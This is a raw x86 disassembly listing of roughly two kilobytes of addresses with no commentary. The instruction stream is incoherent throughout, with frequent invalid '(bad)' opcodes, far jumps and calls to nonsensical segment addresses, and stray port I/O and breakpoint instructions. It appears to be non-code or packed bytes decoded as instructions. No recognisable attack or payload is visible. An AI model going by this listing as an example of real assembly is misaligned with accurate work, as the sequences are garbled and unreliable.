  424e09:	dec    esp
  424e0b:	add    bh,dh
  424e0d:	xlat   BYTE PTR ds:[ebx]
  424e0e:	jmp    FWORD PTR [ecx]
  424e10:	sub    al,0xff
  424e12:	add    bh,bh
  424e14:	out    dx,al
  424e15:	xor    bh,bh
  424e17:	xchg   ecx,eax
  424e18:	ret    0xcc
  424e1b:	add    BYTE PTR [edx-0x5e04ff1f],ah
  424e21:	add    DWORD PTR [eax],0xffffffff
  424e24:	addr16 mov dh,0xff
  424e27:	dec    esp
  424e28:	pop    ebx
  424e29:	inc    DWORD PTR [ebx-0x55ae01]
  424e2f:	outs   dx,DWORD PTR ds:[esi]
  424e30:	or     bh,bh
  424e32:	mov    esp,ecx
  424e34:	mov    esp,0xe35dff61
  424e39:	(bad)  
  424e3a:	(bad)  
  424e3b:	call   FWORD PTR [edi-0x16]
  424e3e:	(bad)  
  424e3f:	mov    ebx,0xffffc9
  424e44:	hlt    
  424e45:	lods   al,BYTE PTR ds:[esi]
  424e46:	jmp    FWORD PTR [ecx-0x7c7c33e5]
  424e4c:	shl    BYTE PTR [edi],0x83
  424e4f:	call   0x5c7a:0x83ffffdb
  424e56:	call   DWORD PTR [esi]
  424e58:	xchg   ebx,eax
  424e59:	dec    DWORD PTR [ecx+0x6a8700]
  424e5f:	test   DWORD PTR [edi+edi*8+0x5c0a00ff],0x894165ff
  424e6a:	(bad)  
  424e6b:	jmp    DWORD PTR [esi+0x353a8954]
  424e71:	(bad)  
  424e72:	(bad)  
  424e73:	(bad)  
  424e74:	std    
  424e75:	pop    ecx
  424e76:	or     DWORD PTR [ecx+edi*2+0x2a00ff83],0xffffffdc
  424e7e:	and    edx,0xffffffb7
  424e81:	mov    edi,edi
  424e83:	inc    DWORD PTR [ebx-0x460760a]
  424e89:	(bad)  
  424e8a:	dec    DWORD PTR [ecx-0x7300aa4c]
  424e90:	pop    eax
  424e91:	inc    DWORD PTR [eax]
  424e93:	add    BYTE PTR [ecx],cl
  424e95:	test   DWORD PTR [eax],eax
  424e97:	cmp    edi,esi
  424e99:	(bad)  
  424e9a:	(bad)  
  424e9b:	jmp    esp
  424e9d:	push   es
  424e9e:	xor    DWORD PTR [edx+ecx*4+0xbccffff],0xffffff98
  424ea6:	int3   
  424ea7:	ins    BYTE PTR es:[edi],dx
  424ea8:	push   0x5a8900ff
  424ead:	dec    esi
  424eae:	dec    DWORD PTR [esi-0x7cffff80]
  424eb4:	stos   BYTE PTR es:[edi],al
  424eb5:	enter  0x2400,0xd8
  424eb9:	add    DWORD PTR [eax],0xffffffff
  424ebc:	shl    BYTE PTR [edi],cl
  424ebe:	call   DWORD PTR [edx]
  424ec0:	sub    al,0x0
  424ec2:	inc    DWORD PTR [eax]
  424ec4:	xchg   ebx,eax
  424ec5:	or     BYTE PTR [eax],al
  424ec7:	dec    esi
  424ec8:	sar    edi,cl
  424eca:	add    bh,bh
  424ecc:	out    0xc8,eax
  424ece:	mov    DWORD PTR [edx-0x38],esi
  424ed1:	add    BYTE PTR [ebx+0x9ff1ff],al
  424ed7:	and    DWORD PTR [ebp+0x21ffff83],esp
  424edd:	lahf   
  424ede:	(bad)  
  424edf:	jns    0x424f0d
  424ee1:	dec    esp
  424ee3:	add    BYTE PTR [edx-0x38c000e6],ch
  424ee9:	int3   
  424eea:	add    bh,bh
  424eec:	pusha  
  424eed:	fdivp  st(7),st
  424eef:	xchg   DWORD PTR [ebx+0x0],ebx
  424ef2:	add    BYTE PTR [eax],al
  424ef4:	addr16 pushf 
  424ef6:	add    BYTE PTR [edi-0xff0039],bl
  424efc:	repnz aaa 
  424efe:	mov    DWORD PTR [ecx],edi
  424f00:	out    0x0,al
  424f02:	int3   
  424f03:	add    BYTE PTR [ebp+0x5ca90015],al
  424f09:	add    DWORD PTR [eax],0xffffffcc
  424f0c:	sbb    al,0xf5
  424f0e:	jmp    FWORD PTR [edi+0x43]
  424f11:	(bad)  
  424f12:	inc    DWORD PTR [eax]
  424f14:	mov    ecx,0xca76831f
  424f19:	(bad)  
  424f1a:	(bad)  
  424f1b:	jmp    FWORD PTR [ebx-0x1a480074]
  424f21:	int3   
  424f22:	add    BYTE PTR [ebx-0x1ffdb22],al
  424f28:	mov    ds:0xf000ccff,al
  424f2d:	in     al,0xff
  424f2f:	xchg   esp,eax
  424f30:	imul   eax,DWORD PTR [eax],0x80ea0083
  424f36:	or     DWORD PTR [edx-0x7c7cff71],0xffffff8b
  424f3d:	push   0x83e91fff
  424f42:	inc    DWORD PTR [ebx-0x4a7c907f]
  424f48:	jecxz  0x424f4a
  424f4a:	(bad)  
  424f4b:	inc    DWORD PTR [esi]
  424f4d:	sar    edi,0x30
  424f50:	mov    es,WORD PTR [eax]
  424f52:	add    BYTE PTR [ebx+0x2100c91e],al
  424f58:	xor    DWORD PTR [eax],eax
  424f5a:	add    bh,bh
  424f5c:	cdq    
  424f5d:	out    dx,al
  424f5e:	int3   
  424f5f:	loope  0x424f03
  424f61:	add    bh,bh
  424f63:	dec    DWORD PTR [ecx+0x1ce900ef]
  424f69:	add    DWORD PTR [eax],0xffffffff
  424f6c:	cs sbb ecx,esp
  424f6f:	bnd ja 0x424f72
  424f72:	int3   
  424f73:	add    BYTE PTR ds:0x58e5003f,ah
  424f79:	add    bh,bh
  424f7b:	add    BYTE PTR [ebp-0x6437cda],dl
  424f81:	cmp    edi,0x0
  424f84:	xlat   BYTE PTR ds:[ebx]
  424f85:	das    
  424f86:	call   eax
  424f88:	fs add bh,bh
  424f8b:	inc    DWORD PTR [ecx]
  424f8d:	mov    bh,0x0
  424f8f:	xchg   BYTE PTR ds:0x6200ff89,cl
  424f95:	sub    eax,0x838366ff
  424f9a:	inc    DWORD PTR [eax]
  424f9c:	xchg   BYTE PTR [edi-0x1],bh
  424f9f:	xlat   BYTE PTR ds:[ebx]
  424fa0:	dec    esp
  424fa1:	add    bh,bh
  424fa3:	mov    DWORD PTR [ebx-0x5972ff28],ebp
  424fa9:	cmp    edi,0xffffffff
  424fac:	dec    esi
  424fad:	fiadd  DWORD PTR [eax]
  424faf:	dec    esp
  424fb0:	lods   al,BYTE PTR ds:[esi]
  424fb1:	mov    DWORD PTR [eax],eax
  424fb3:	int3   
  424fb4:	push   0xffffffb2
  424fb6:	int3   
  424fb7:	mov    cl,0x1d
  424fb9:	(bad)  
  424fba:	inc    DWORD PTR [eax]
  424fbc:	fidivr WORD PTR [edi-0xeeb100]
  424fc2:	(bad)  
  424fc3:	jmp    DWORD PTR ds:0x80cb896b
  424fc9:	int3   
  424fca:	inc    DWORD PTR [eax]
  424fcc:	ins    DWORD PTR es:[edi],dx
  424fcd:	es adc ebp,0xfffffff7
  424fd1:	inc    DWORD PTR [eax]
  424fd3:	(bad)  
  424fd4:	in     al,dx
  424fd5:	xchg   ecx,eax
  424fd6:	cmp    DWORD PTR [ecx-0x16],0xffffff83
  424fda:	inc    DWORD PTR [eax]
  424fdc:	add    DWORD PTR [ebp+0xf0b900],edi
  424fe2:	add    BYTE PTR [eax],al
  424fe4:	xor    al,0x34
  424fe6:	(bad)  
  424fe7:	jge    0x424fec
  424fe9:	inc    DWORD PTR [eax]
  424feb:	add    bl,dl
  424fed:	retf   
  424fee:	mov    DWORD PTR [ebx+0x7],ecx
  424ff1:	(bad)  
  424ff2:	inc    DWORD PTR [eax]
  424ff4:	scas   al,BYTE PTR es:[edi]
  424ff5:	fwait
  424ff6:	add    DWORD PTR [ebp-0x7c88],0x26
  424ffd:	rol    BYTE PTR [eax],1
  424fff:	xchg   edx,eax
  425000:	pop    eax
  425001:	add    bh,bh
  425003:	add    dl,ch
  425005:	push   eax
  425006:	add    BYTE PTR [edx+ebp*2+0x21ffff83],cl
  42500d:	or     edi,edi
  42500f:	pop    es
  425010:	das    
  425011:	inc    DWORD PTR [eax]
  425013:	int3   
  425014:	pop    edi
  425015:	mov    bh,0xff
  425017:	xor    DWORD PTR [esi-0x1],0xffffffff
  42501b:	add    BYTE PTR [ebx-0x15],ch
  42501e:	call   ebx
  425020:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425021:	inc    DWORD PTR [eax]
  425023:	add    BYTE PTR [edx-0x33b87617],bh
  425029:	dec    esp
  42502b:	add    bl,bl
  42502d:	jbe    0x42502e
  42502f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425030:	data16 add BYTE PTR [eax],al
  425033:	add    BYTE PTR [ecx+0x47f1ff9c],dl
  425039:	inc    DWORD PTR [ebx+0x1827ff]
  42503f:	popa   
  425040:	pop    ebp
  425041:	(bad)  
  425042:	(bad)  
  425043:	call   DWORD PTR [edx-0x7]
  425046:	and    DWORD PTR [ebp+ebp*4+0x51838383],0xfffffff1
  42504e:	jmp    eax
  425050:	idiv   bh
  425052:	int3   
  425053:	and    ebp,0xffffffec
  425056:	add    BYTE PTR [esi],al
  425058:	sar    edi,0x0
  42505b:	dec    esi
  42505d:	add    al,BYTE PTR [ebx-0xff13b9]
  425063:	push   DWORD PTR [ecx]
  425065:	ins    BYTE PTR es:[edi],dx
  425066:	jmp    FWORD PTR [edx]
  425068:	sahf   
  425069:	inc    DWORD PTR [ebx+0x9a2100]
  42506f:	fcomi  st,st(1)
  425071:	int3   
  425072:	add    bh,bh
  425074:	adc    al,0xbf
  425076:	add    dl,cl
  425078:	pop    ss
  425079:	mov    DWORD PTR [eax],eax
  42507b:	and    DWORD PTR [ecx],0xffffff90
  42507e:	int3   
  42507f:	xchg   ch,cl
  425081:	cmp    edi,0xffffffff
  425084:	push   ds
  425085:	and    al,0xff
  425087:	cmp    dl,BYTE PTR [ecx+0x0]
  42508a:	cmp    edi,0x12
  42508d:	push   0xeeecff
  425092:	add    DWORD PTR [eax],0x19
  425095:	out    0x0,al
  425097:	fcmovu st,st(5)
  425099:	add    bh,bh
  42509b:	add    BYTE PTR [edx-0x51],dl
  42509e:	inc    DWORD PTR [ecx+0xffffd1]
  4250a4:	in     al,dx
  4250a5:	int3   
  4250a6:	add    BYTE PTR [ebx-0x71],ah
  4250ac:	pop    ebp
  4250ad:	mov    edi,edi
  4250af:	push   ds
  4250b0:	jmp    0xff57:0x76ffff00
  4250b7:	ds inc ebp
  4250b9:	int3   
  4250ba:	dec    DWORD PTR [ecx+0x6e83792e]
  4250c0:	xor    al,BYTE PTR [ebx+0x7afbff89]
  4250c6:	int3   
  4250c7:	mov    ds:0xffffcc5d,al
  4250cc:	nop
  4250cd:	out    0x83,al
  4250cf:	mov    ah,0x39
  4250d1:	int3   
  4250d2:	(bad)  
  4250d3:	call   FWORD PTR [ecx]
  4250d5:	dec    ah
  4250d7:	leave  
  4250d8:	stc    
  4250d9:	(bad)  
  4250da:	(bad)  
  4250db:	dec    ebp
  4250dd:	add    DWORD PTR [ebx+0x8362c9],eax
  4250e3:	int3   
  4250e4:	mov    esi,0xd0c1ffa9
  4250e9:	mov    DWORD PTR [ebx-0xf9fa00],eax
  4250ef:	lea    eax,[esi-0x19003301]
  4250f5:	add    bh,bh
  4250f7:	cld    
  4250f8:	cmp    bh,bh
  4250fa:	add    DWORD PTR [ebx+0xaff0138],0xffffff96
  425101:	int3   
  425102:	add    bh,bh
  425104:	mov    ebx,DWORD PTR [edx]
  425106:	add    BYTE PTR [eax],bl
  425108:	push   edx
  425109:	add    DWORD PTR [eax],0x0
  42510c:	pusha  
  42510d:	sub    edi,edi
  42510f:	dec    edi
  425110:	jbe    0x425111
  425112:	add    BYTE PTR [eax],al
  425114:	push   eax
  425115:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425116:	(bad)  
  425117:	mov    esp,0xffffff93
  42511c:	sbb    al,BYTE PTR [edx]
  42511e:	inc    DWORD PTR [esi-0x1a]
  425121:	add    BYTE PTR [ecx+0x546c83],cl
  425127:	shl    DWORD PTR [edi+0x0],0xcc
  42512b:	dec    DWORD PTR [edx+0x30]
  42512e:	int3   
  42512f:	clc    
  425130:	pop    ebx
  425131:	dec    esp
  425133:	cmp    edx,0xffffffb9
  425136:	call   DWORD PTR [edx-0x7c00006a]
  42513c:	inc    DWORD PTR [bx+si]
  42513f:	mov    edx,DWORD PTR [esp+ecx*8-0x20900001]
  425146:	call   ecx
  425148:	inc    esp
  425149:	add    BYTE PTR [eax],al
  42514b:	(bad)  
  42514c:	jns    0x425147
  42514e:	jmp    DWORD PTR [edx]
  425150:	mov    ebp,0xfa00ff00
  425155:	lods   eax,DWORD PTR ds:[esi]
  425156:	add    BYTE PTR [ebp-0x7c760030],al
  42515c:	and    cl,BYTE PTR [edx+0xf57dff]
  425162:	cmp    edi,0x0
  425165:	stos   DWORD PTR es:[edi],eax
  425166:	int3   
  425167:	dec    esi
  425168:	int3   
  425169:	add    BYTE PTR [eax],al
  42516b:	add    BYTE PTR [ecx+ebx*4+0x3e1200],ah
  425172:	(bad)  
  425173:	jmp    FWORD PTR [ebp+edi*4+0x0]
  425177:	sub    ch,dl
  425179:	(bad)  
  42517a:	(bad)  
  42517b:	inc    eax
  42517d:	push   ebp
  42517e:	dec    DWORD PTR [eax-0xff7d]
  425184:	stos   BYTE PTR es:[edi],al
  425185:	push   eax
  425186:	and    DWORD PTR [ebp+0x79],0x0
  42518a:	add    BYTE PTR [ebx-0x660079ac],al
  425190:	arpl   WORD PTR [eax],ax
  425192:	dec    esp
  425194:	add    al,0x65
  425196:	dec    DWORD PTR [ebp-0x337c79]
  42519c:	jge    0x425206
  42519e:	(bad)  
  42519f:	jnp    0x4251ae
  4251a1:	add    bh,bh
  4251a3:	(bad)  
  4251a4:	jmp    0xff89:0x4a55833b
  4251ab:	int3   
  4251ac:	cmp    al,0x65
  4251ae:	jmp    FWORD PTR [edx+0x6a]
  4251b1:	mov    edi,edi
  4251b3:	jmp    ebp
  4251b5:	in     eax,0xcc
  4251b7:	add    cl,ah
  4251b9:	add    BYTE PTR [eax],al
  4251bb:	jmp    FWORD PTR [eax+0x725e0050]
  4251c1:	inc    DWORD PTR [ebx+0x7c10ff]
  4251c7:	xchg   esp,eax
  4251c8:	pop    ebx
  4251c9:	add    BYTE PTR [ecx-0x64f001],cl
  4251cf:	inc    esp
  4251d0:	cmp    bh,0x0
  4251d3:	push   ebp
  4251d5:	leave  
  4251d6:	call   FWORD PTR [ebp+0xffff8e]
  4251dc:	aas    
  4251dd:	inc    esi
  4251de:	add    BYTE PTR [eax-0x16],al
  4251e1:	int3   
  4251e2:	inc    DWORD PTR [ebx+0x41ccc821]
  4251e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4251e9:	dec    esp
  4251eb:	add    BYTE PTR [edx],al
  4251ed:	xchg   ebx,eax
  4251ee:	call   FWORD PTR [esi-0x96]
  4251f4:	(bad)  
  4251f5:	and    al,0x0
  4251f7:	out    dx,al
  4251f8:	arpl   di,di
  4251fa:	add    bh,bh
  4251fc:	mov    esp,0xe59800d1
  425201:	(bad)  
  425202:	inc    DWORD PTR [eax]
  425204:	and    DWORD PTR [ecx+0x0],0xffffff96
  425208:	into   
  425209:	(bad)  
  42520a:	dec    esp
  42520c:	pop    esp
  42520d:	fadd   DWORD PTR [ebx-0x3376ad35]
  425213:	add    BYTE PTR [ebx+edi*2+0x0],al
  425217:	and    bl,bh
  425219:	cmp    edi,0xffffffff
  42521c:	mov    BYTE PTR [edx+0xf9c983],al
  425222:	add    BYTE PTR [ebx+0x64fffd12],al
  425228:	cli    
  425229:	inc    DWORD PTR [eax]
  42522b:	dec    DWORD PTR [ebx-0x5f9cff33]
  425231:	add    bh,bh
  425233:	mov    DWORD PTR [esp+ebx*4-0x76a25a7d],ebp
  42523a:	add    BYTE PTR [eax],al
  42523c:	xor    ecx,DWORD PTR [edx-0x694d01]
  425242:	add    DWORD PTR [eax],0x1f
  425245:	nop
  425246:	(bad)  
  425247:	mov    edx,0xff00f2
  42524c:	push   ss
  42524d:	push   edi
  42524e:	jmp    FWORD PTR [eax-0x73]
  425251:	inc    DWORD PTR [eax]
  425253:	call   FWORD PTR [edx]
  425255:	adc    edi,edi
  425257:	inc    edx
  425258:	add    DWORD PTR [eax],0xf7290000
  42525e:	mov    ebx,eax
  425260:	loope  0x425261
  425262:	or     DWORD PTR [ecx-0x260087cf],0x64
  425269:	int3   
  42526a:	cmp    edi,0x51
  42526d:	add    bh,bh
  42526f:	jle    0x425229
  425271:	inc    DWORD PTR [ebx-0x7cb27e01]
  425277:	cmp    BYTE PTR [esi-0x1],0x89
  42527b:	mov    DWORD PTR [esp+ebp*1],eax
  42527e:	call   DWORD PTR [eax]
  425280:	add    BYTE PTR [eax],al
  425282:	(bad)  
  425283:	(bad)  
  425284:	std    
  425285:	fld    DWORD PTR [ebx-0x7c6327]
  42528b:	add    cl,ah
  42528d:	icebp  
  42528e:	(bad)  
  42528f:	(bad)  
  425290:	jne    0x425215
  425292:	add    BYTE PTR [eax],al
  425294:	nop
  425295:	xchg   edx,eax
  425296:	or     DWORD PTR [edi+0x890079],0x41
  42529d:	pop    esp
  42529e:	jmp    FWORD PTR [ecx]
  4252a0:	mov    ebx,0xf8ffffff
  4252a5:	xchg   edi,eax
  4252a6:	add    BYTE PTR [eax-0x41],ch
  4252a9:	(bad)  
  4252aa:	inc    DWORD PTR [eax]
  4252ac:	push   esi
  4252ad:	add    BYTE PTR [bx+si],bh
  4252b0:	push   ecx
  4252b1:	dec    esp
  4252b3:	int3   
  4252b4:	enter  0xccc4,0x6
  4252b8:	fs (bad) 
  4252ba:	(bad)  
  4252bb:	(bad)  
  4252bc:	cmp    DWORD PTR [edi-0x1],esp
  4252bf:	stc    
  4252c0:	call   0x75:0x87ff8300
  4252c7:	cwde   
  4252c8:	xchg   ebp,eax
  4252c9:	(bad)  
  4252ca:	(bad)  
  4252cb:	call   FWORD PTR [edi+0x3302ff37]
  4252d1:	(bad)  
  4252d2:	inc    DWORD PTR [ebx-0xf000af4]
  4252d8:	sahf   
  4252d9:	(bad)  
  4252da:	(bad)  
  4252db:	jmp    DWORD PTR [eax-0x7a]
  4252de:	or     ebp,0xffffffcd
  4252e1:	inc    DWORD PTR [ebx+0xe352ff]
  4252e7:	sub    al,0xfd
  4252e9:	add    BYTE PTR [eax],al
  4252eb:	dec    DWORD PTR [ebx+0x7f]
  4252ee:	call   DWORD PTR [edi-0xff0094]
  4252f4:	adc    ebx,DWORD PTR [edi-0x77]
  4252f7:	or     DWORD PTR [ebx-0x1],esi
  4252fa:	cmp    edi,0x26
  4252fd:	(bad)  
  4252fe:	inc    DWORD PTR [eax+0xff0012]
  425304:	jmp    0x4252ea
  425306:	dec    edi
  425308:	cdq    
  425309:	(bad)  
  42530a:	dec    DWORD PTR [ecx-0x33ffd53f]
  425310:	mov    bh,0x0
  425312:	(bad)  
  425313:	dec    DWORD PTR [edi-0x30a80045]
  425319:	inc    DWORD PTR [eax]
  42531b:	(bad)  
  42531c:	jge    0x425346
  42531e:	dec    DWORD PTR [eax-0x7c330017]
  425324:	rcl    BYTE PTR [esp+ecx*8+0x7a],1
  425328:	cmp    edi,edi
  42532a:	mov    DWORD PTR [eax],eax
  42532c:	adc    al,0x70
  42532e:	push   DWORD PTR [ebp-0xff7698]
  425334:	xor    esi,DWORD PTR [ebp-0x7caef400]
  42533a:	mov    edi,edi
  42533c:	push   edi
  42533d:	cmc    
  42533e:	int3   
  42533f:	leave  
  425340:	dec    ecx
  425341:	cmp    edi,0x0
  425344:	sbb    ecx,ebx
  425346:	mov    DWORD PTR [ebx],edi
  425348:	data16 add bh,bh
  42534b:	jmp    DWORD PTR [ecx+0x10]
  42534e:	add    BYTE PTR [ebp+0x11],ch
  425351:	inc    DWORD PTR [eax]
  425353:	inc    esi
  425355:	mov    ch,0x89
  425357:	xchg   ebx,eax
  425358:	pop    ecx
  425359:	add    DWORD PTR [eax],0x0
  42535c:	xchg   edi,eax
  42535d:	inc    esp
  42535e:	push   edx
  425360:	test   BYTE PTR [ebx-0x70217c01],al
  425366:	dec    DWORD PTR [ebp+0xffff0a]
  42536c:	jns    0x425359
  42536e:	add    BYTE PTR [edi-0x39],bl
  425371:	inc    DWORD PTR [eax]
  425373:	inc    DWORD PTR [ebx+0x71]
  425376:	add    BYTE PTR [edx+0x28],ch
  425379:	inc    DWORD PTR [eax]
  42537b:	push   DWORD PTR [ecx+0x2f]
  42537e:	int3   
  42537f:	add    DWORD PTR [esi-0x7d],esp
  425382:	or     esp,0x48
  425385:	xchg   ecx,eax
  425386:	mov    edx,esp
  425388:	popa   
  425389:	inc    DWORD PTR [eax]
  42538b:	int3   
  42538c:	(bad)  
  42538e:	call   ecx
  425390:	push   esp
  425391:	add    BYTE PTR [eax],al
  425393:	call   FWORD PTR [edi+0xe24ffd5]
  425399:	mov    edi,edi
  42539b:	add    dh,ch
  42539d:	es int3 
  42539f:	stos   BYTE PTR es:[edi],al
  4253a0:	jnp    0x4253a2
  4253a2:	inc    DWORD PTR [eax]
  4253a4:	mov    dh,0x75
  4253a6:	add    BYTE PTR ds:0xff2c,bl
  4253ac:	fsubp  st(5),st
  4253ae:	mov    eax,ebp
  4253b0:	call   0xff3e:0x74ffff89
  4253b7:	pop    eax
  4253b8:	call   0x440e53bd
  4253bd:	aad    0xff
  4253bf:	jbe    0x4253c3
  4253c1:	add    bh,bh
  4253c3:	dec    ebx
  4253c5:	inc    BYTE PTR [ebx+0xff9d0b]
  4253cb:	(bad)  
  4253cc:	jns    0x425418
  4253ce:	push   esp
  4253d0:	les    eax,FWORD PTR [eax]
  4253d2:	add    BYTE PTR [eax],al
  4253d4:	adc    al,0x6a
  4253d6:	int3   
  4253d7:	xor    DWORD PTR [ebx-0x3f000001],0xd2e9ff4c
  4253e1:	mov    edi,edi
  4253e3:	int3   
  4253e4:	test   al,0x37
  4253e6:	(bad)  
  4253e7:	mov    edx,0xfffffff0
  4253ec:	mov    dl,0x57
  4253ee:	inc    DWORD PTR [edi-0x39]
  4253f1:	inc    DWORD PTR [eax]
  4253f3:	inc    DWORD PTR [edi]
  4253f5:	xor    eax,0x1ba5ff
  4253fa:	add    bh,bh
  4253fc:	xor    eax,0x70bf00cc
  425401:	add    DWORD PTR [eax],0xffffffff
  425404:	adc    al,BYTE PTR [eax-0x1]
  425407:	xchg   ecx,eax
  425408:	dec    ebp
  425409:	add    BYTE PTR [ecx-0x7c3b4a34],cl
  42540f:	(bad)  
  425410:	in     al,dx
  425411:	inc    DWORD PTR [eax]
  425413:	add    BYTE PTR [eax-0x4f],ah
  425416:	(bad)  
  425417:	in     al,dx
  425418:	fild   WORD PTR [ebx+0x857ff00]
  42541e:	add    cl,bl
  425420:	inc    eax
  425421:	add    BYTE PTR [eax],al
  425423:	add    dh,ch
  425425:	add    al,BYTE PTR [ebx-0x33002eed]
  42542b:	add    BYTE PTR [edi],dh
  42542d:	mov    dh,0xcc
  42542f:	pop    es
  425430:	pop    esp
  425431:	cmp    edi,0xffffffff
  425434:	mov    esp,0x81f1ff84
  425439:	(bad)  
  42543a:	inc    DWORD PTR [ebx+0x4b00a2fc]
  425440:	pop    es
  425441:	(bad)  
  425442:	inc    DWORD PTR [eax]
  425444:	xchg   BYTE PTR [ebx+0xe000ff],cl
  42544a:	add    BYTE PTR [ecx-0x5b7c29bd],cl
  425450:	call   0xccd9:0x890000ff
  425457:	in     eax,dx
  425458:	sbb    bh,bh
  42545a:	add    bh,bh
  42545c:	dec    esi
  42545d:	sub    BYTE PTR [eax],al
  42545f:	xor    BYTE PTR [ebp-0x48767700],bh
  425465:	add    al,BYTE PTR [eax]
  425467:	test   eax,0xffffffb0
  42546c:	jmp    0x8b6c538f
  425471:	add    bh,bh
  425473:	add    BYTE PTR ds:0x31430063,dl
  425479:	(bad)  
  42547a:	inc    DWORD PTR [eax]
  42547c:	iret   
  42547d:	daa    
  42547e:	inc    DWORD PTR [edx]
  425480:	pop    ds
  425481:	(bad)  
  425482:	inc    DWORD PTR [eax]
  425484:	jno    0x42540f
  425486:	add    BYTE PTR [esi+0x11],bh
  425489:	(bad)  
  42548a:	inc    DWORD PTR [ebx+0x22ff093b]
  425490:	dec    edx
  425491:	(bad)  
  425492:	(bad)  
  425493:	call   DWORD PTR [eax+0x1b57ffc0]
  425499:	inc    DWORD PTR [eax]
  42549b:	add    BYTE PTR [ecx+ebx*8-0xcc5b00],dh
  4254a2:	(bad)  
  4254a3:	call   esi
  4254a5:	jg     0x4254a7
  4254a7:	ret    0xff60
  4254aa:	mov    DWORD PTR [ebx-0x5800072c],eax
  4254b0:	sbb    eax,0xbaff0000
  4254b5:	jns    0x4254b6
  4254b7:	cmp    DWORD PTR [esi-0x10000034],ecx
  4254bd:	in     eax,dx
  4254be:	add    BYTE PTR [edi+eax*2+0x6dff00ff],dh
  4254c5:	test   DWORD PTR [ebx-0x7cffaec4],eax
  4254cb:	add    BYTE PTR [edi],bl
  4254cd:	fwait
  4254ce:	sbb    ebx,0xffffffe0
  4254d1:	mov    DWORD PTR [eax],eax
  4254d3:	mov    DWORD PTR [ecx-0x26],edx
  4254d6:	call   FWORD PTR [ebp+eiz*8+0x0]
  4254da:	inc    DWORD PTR [eax]
  4254dc:	arpl   WORD PTR [ecx-0x3374a401],cx
  4254e2:	add    bh,bh
  4254e4:	shl    DWORD PTR [ecx-0x29b301],1
  4254ea:	inc    DWORD PTR [eax]
  4254ec:	pop    ebp
  4254ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4254ee:	sub    DWORD PTR [esi+eiz*8-0x41ff0001],0x3
  4254f6:	jmp    FWORD PTR [ebx+edi*2+0x79ff00ff]
  4254fd:	out    dx,eax
  4254fe:	add    bh,bl
  425500:	inc    esi
  425501:	add    BYTE PTR [eax],al
  425503:	inc    DWORD PTR [eax-0x7b]
  425506:	xor    DWORD PTR [esi-0xff7cf7],0xffffffe5
  42550d:	outs   dx,BYTE PTR ds:[esi]
  42550e:	add    BYTE PTR [eax],dh
  425510:	mov    dl,0xff
  425512:	add    bh,bh
  425514:	rol    DWORD PTR [ebx-0x2e6b00],0x83
  42551b:	int3   
  42551c:	jnp    0x425549
  42551e:	(bad)  
  42551f:	sti    
  425520:	mov    BYTE PTR [ebx+0x11d00089],0xff
  425527:	and    al,0xf9
  425529:	(bad)  
  42552a:	(bad)  
  42552b:	(bad)  
  42552c:	jmp    0x0:0x9939ff18
  425533:	int3   
  425534:	xchg   ecx,eax
  425535:	or     al,0xff
  425537:	les    ecx,FWORD PTR [ebx-0xbff7c7d]
  42553d:	and    bh,bh
  42553f:	ret    0xff51
  425542:	add    bh,bh
  425544:	cmc    
  425545:	pop    esi
  425546:	add    BYTE PTR [esi+0xa],al
  425549:	add    BYTE PTR [ebx+0xead9ff],al
  42554f:	sub    ebx,ebx
  425551:	inc    DWORD PTR [eax]
  425553:	sbb    DWORD PTR [ebp-0x43],0xffffff83
  425557:	add    ebx,DWORD PTR [ecx-0x7d]
  42555a:	inc    DWORD PTR [eax]
  42555c:	sbb    esi,DWORD PTR ds:0xcc0992ff
  425562:	cmp    edi,0x67
  425565:	pop    ss
  425566:	jmp    FWORD PTR [edx]
  425568:	jg     0x425569
  42556a:	mov    edi,edi
  42556c:	mov    dh,0xd8
  42556e:	add    BYTE PTR [esi],cl
  425570:	cmp    eax,0x1d000083
  425575:	fcmove st,st(4)
  425577:	inc    esp
  425578:	xor    eax,DWORD PTR [eax]
  42557a:	add    DWORD PTR [ebx-0x7d00f4e1],0x17
  425581:	inc    DWORD PTR [eax]
  425583:	add    bl,ch
  425585:	jnp    0x425586
  425587:	(bad)  
  425588:	inc    esp
  425589:	add    bh,bh
  42558b:	int3   
  42558c:	imul   esp
  42558e:	jmp    FWORD PTR [edx+0x37]
  425591:	add    bh,bh
  425593:	mov    DWORD PTR [esi-0x22],eax
  425596:	add    bh,bl
  425598:	sbb    ah,cl
  42559a:	add    bh,bh
  42559c:	add    ebp,DWORD PTR [edi+0x72bb00]
  4255a2:	add    bh,bh
  4255a4:	int3   
  4255a5:	inc    ecx
  4255a6:	push   DWORD PTR [edi]
  4255a8:	jns    0x4255a9
  4255aa:	add    BYTE PTR [eax],al
  4255ac:	pop    edi
  4255ad:	sahf   
  4255ae:	add    cl,dh
  4255b0:	je     0x42553b
  4255b2:	inc    DWORD PTR [ebx+0x38ccaaa5]
  4255b8:	inc    esp
  4255b9:	add    bh,bh
  4255bb:	add    BYTE PTR [ebp-0x15],dl
  4255be:	call   DWORD PTR [ebx+0x898335]
  4255c4:	mov    cl,0xfc
  4255c6:	push   DWORD PTR [edi+0xff0029]
  4255cc:	mov    esi,0x6592ffe6
  4255d1:	add    BYTE PTR [eax],al
  4255d3:	and    ebx,0x3c
  4255d6:	jmp    DWORD PTR [ecx]
  4255d8:	aaa    
  4255d9:	dec    esp
  4255db:	add    BYTE PTR [edx+0x66da0034],ah
  4255e1:	int3   
  4255e2:	add    bh,bh
  4255e4:	pop    ecx
  4255e5:	call   DWORD PTR [si+0xc3]
  4255ea:	add    bh,bh
  4255ec:	jmp    0xffcc:0xeafd006e
  4255f3:	add    BYTE PTR [ebx-0x53],ch
  4255f6:	add    bl,ah
  4255f8:	mov    edx,0x8100ffff
  4255fd:	jae    0x4255ff
  4255ff:	jecxz  0x4255c6
  425601:	dec    esp
  425603:	add    cl,bl
  425605:	jmp    DWORD PTR ds:0xff36
  42560a:	add    bh,bh
  42560c:	(bad)  [edi+edi*8+0xffa56f]
  425613:	add    BYTE PTR [ecx],bh
  425615:	pop    ecx
  425616:	int3   
  425617:	jg     0x425643
  425619:	cmp    edi,0x0
  42561c:	addr16 sahf 
  42561e:	mov    DWORD PTR [ecx-0xe],esp
  425621:	add    bh,bh
  425623:	add    BYTE PTR [ebp+0x72f0ff0b],dh
  425629:	dec    DWORD PTR [ecx+0x716589]
  42562f:	(bad)  
  425630:	test   DWORD PTR [eax],0x36410000
